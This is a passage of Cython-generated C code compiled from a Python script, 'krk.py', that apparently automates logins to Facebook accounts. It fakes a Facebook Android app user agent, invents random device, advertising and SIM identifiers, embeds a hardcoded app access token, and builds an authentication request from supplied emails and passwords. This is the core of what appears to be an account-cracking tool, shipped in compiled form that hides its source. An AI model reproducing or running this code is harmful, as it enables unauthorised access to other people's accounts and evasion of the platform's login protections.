        __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_v_fbmf); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_FBBD); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_v_fbbd); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_FBPN); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_v_fbpn); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_FBDV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_v_fbdv); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_FBSV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_v_fbsv); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_9_FBOP_1_FBCA); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_v_fbca); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__75); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":609
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'9.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';en_US;FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/'+fbdm+';{density=4.0,width=1440,height=3127};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';9;FBOP/1;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()             # <<<<<<<<<<<<<<
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())
 */
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 609, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_Random); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 609, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_2, };
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 609, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_random_seed, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":610
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'9.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';en_US;FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/'+fbdm+';{density=4.0,width=1440,height=3127};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';9;FBOP/1;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))             # <<<<<<<<<<<<<<
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_random_seed, __pyx_n_s_choices); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 610, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_string); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 610, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_hexdigits); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 610, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = PyTuple_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 610, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_GIVEREF(__pyx_t_2);
        PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_2);
        __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 610, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_k, __pyx_int_16) < 0) __PYX_ERR(0, 610, __pyx_L3_error)
        __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_6, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 610, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 610, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 610, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF_SET(__pyx_v_adid, __pyx_t_3);
        __pyx_t_3 = 0;

        /* "krk.py":611
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())
 */
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_uuid); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 611, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 611, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_2, };
          __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 611, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __pyx_t_6 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 611, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF_SET(__pyx_v_device_id, __pyx_t_6);
        __pyx_t_6 = 0;

        /* "krk.py":612
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_uuid); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 612, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 612, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_3, };
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 612, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        }
        __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 612, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_secure, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":613
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_uuid); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 613, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 613, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 613, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
        __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 613, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF_SET(__pyx_v_family, __pyx_t_3);
        __pyx_t_3 = 0;

        /* "krk.py":614
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'             # <<<<<<<<<<<<<<
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'
 */
        __Pyx_INCREF(__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
        __Pyx_DECREF_SET(__pyx_v_accessToken, __pyx_kp_s_350685531728_62f8ce9f74b12f84c12);

        /* "krk.py":615
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))             # <<<<<<<<<<<<<<
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']
 */
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_random_seed, __pyx_n_s_choices); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 615, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_string); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 615, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_digits); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 615, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyTuple_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 615, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_6);
        __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 615, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_k, __pyx_int_20) < 0) __PYX_ERR(0, 615, __pyx_L3_error)
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_2, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 615, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 615, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 615, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_xd, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":616
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'             # <<<<<<<<<<<<<<
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 */
        __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 616, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_12 = 0;
        __pyx_t_13 = 127;
        __Pyx_INCREF(__pyx_kp_u__76);
        __pyx_t_12 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__76);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u__76);
        __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_xd, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 616, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_13;
        __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_6);
        __pyx_t_6 = 0;
        __Pyx_INCREF(__pyx_kp_u__77);
        __pyx_t_12 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__77);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u__77);
        __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 616, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_sim_serials, ((PyObject*)__pyx_t_6));
        __pyx_t_6 = 0;

        /* "krk.py":617
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']             # <<<<<<<<<<<<<<
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))
 */
        __pyx_t_6 = PyList_New(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 617, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_INCREF(__pyx_kp_s_28);
        __Pyx_GIVEREF(__pyx_kp_s_28);
        PyList_SET_ITEM(__pyx_t_6, 0, __pyx_kp_s_28);
        __Pyx_INCREF(__pyx_kp_s_29);
        __Pyx_GIVEREF(__pyx_kp_s_29);
        PyList_SET_ITEM(__pyx_t_6, 1, __pyx_kp_s_29);
        __Pyx_INCREF(__pyx_kp_s_210);
        __Pyx_GIVEREF(__pyx_kp_s_210);
        PyList_SET_ITEM(__pyx_t_6, 2, __pyx_kp_s_210);
        __Pyx_XDECREF_SET(__pyx_v_li, ((PyObject*)__pyx_t_6));
        __pyx_t_6 = 0;

        /* "krk.py":618
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)             # <<<<<<<<<<<<<<
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))
 *                         jazoest = li2+j1
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 618, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 618, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_v_li};
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 618, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_li2, __pyx_t_6);
        __pyx_t_6 = 0;

        /* "krk.py":619
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */
        __pyx_t_6 = __pyx_pf_3krk_4rndm_genexpr(NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 619, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_2 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 619, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_j1, ((PyObject*)__pyx_t_2));
        __pyx_t_2 = 0;

        /* "krk.py":620
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))
 *                         jazoest = li2+j1             # <<<<<<<<<<<<<<
 *                         data = {
 *                                 'adid':adid,
 */
        __pyx_t_2 = PyNumber_Add(__pyx_v_li2, __pyx_v_j1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 620, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_XDECREF_SET(__pyx_v_jazoest, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":622
 *                         jazoest = li2+j1
 *                         data = {
 *                                 'adid':adid,             # <<<<<<<<<<<<<<
 *                                 'format':'json',
 *                                 'device_id':device_id,
 */
        __pyx_t_2 = __Pyx_PyDict_NewPresized(13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 622, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_adid, __pyx_v_adid) < 0) __PYX_ERR(0, 622, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_format, __pyx_n_s_json) < 0) __PYX_ERR(0, 622, __pyx_L3_error)

        /* "krk.py":624
 *                                 'adid':adid,
 *                                 'format':'json',
 *                                 'device_id':device_id,             # <<<<<<<<<<<<<<
 *                                 'email':ids,
 *                                 'password':pas,
 */
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_device_id, __pyx_v_device_id) < 0) __PYX_ERR(0, 622, __pyx_L3_error)

        /* "krk.py":625
 *                                 'format':'json',
 *                                 'device_id':device_id,
 *                                 'email':ids,             # <<<<<<<<<<<<<<
 *                                 'password':pas,
 *                                 'generate_analytics_claims':'1',
 */
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_email, __pyx_v_ids) < 0) __PYX_ERR(0, 622, __pyx_L3_error)

        /* "krk.py":626
 *                                 'device_id':device_id,
 *                                 'email':ids,
 *                                 'password':pas,             # <<<<<<<<<<<<<<
 *                                 'generate_analytics_claims':'1',
 *                                 'credentials_type':'password',
 */
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_password, __pyx_v_pas) < 0) __PYX_ERR(0, 622, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_generate_analytics_claims, __pyx_kp_s_1) < 0) __PYX_ERR(0, 622, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_credentials_type, __pyx_n_s_password) < 0) __PYX_ERR(0, 622, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_source, __pyx_n_s_login) < 0) __PYX_ERR(0, 622, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_error_detail_type, __pyx_n_s_button_with_disabled) < 0) __PYX_ERR(0, 622, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_enroll_misauth, __pyx_n_s_false) < 0) __PYX_ERR(0, 622, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_generate_session_cookies, __pyx_kp_s_1) < 0) __PYX_ERR(0, 622, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_generate_machine_id, __pyx_kp_s_1) < 0) __PYX_ERR(0, 622, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_fb_api_req_friendly_name, __pyx_n_s_authenticate) < 0) __PYX_ERR(0, 622, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_2));
        __pyx_t_2 = 0;

        /* "krk.py":637
 *                         }
 *                         headers={
 *                                 'Authorization':f'OAuth {accessToken}',             # <<<<<<<<<<<<<<
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Type':'unknown',
 */
        __pyx_t_2 = __Pyx_PyDict_NewPresized(7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 637, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_accessToken, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 637, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_kp_u_OAuth, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 637, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_Authorization, __pyx_t_4) < 0) __PYX_ERR(0, 637, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
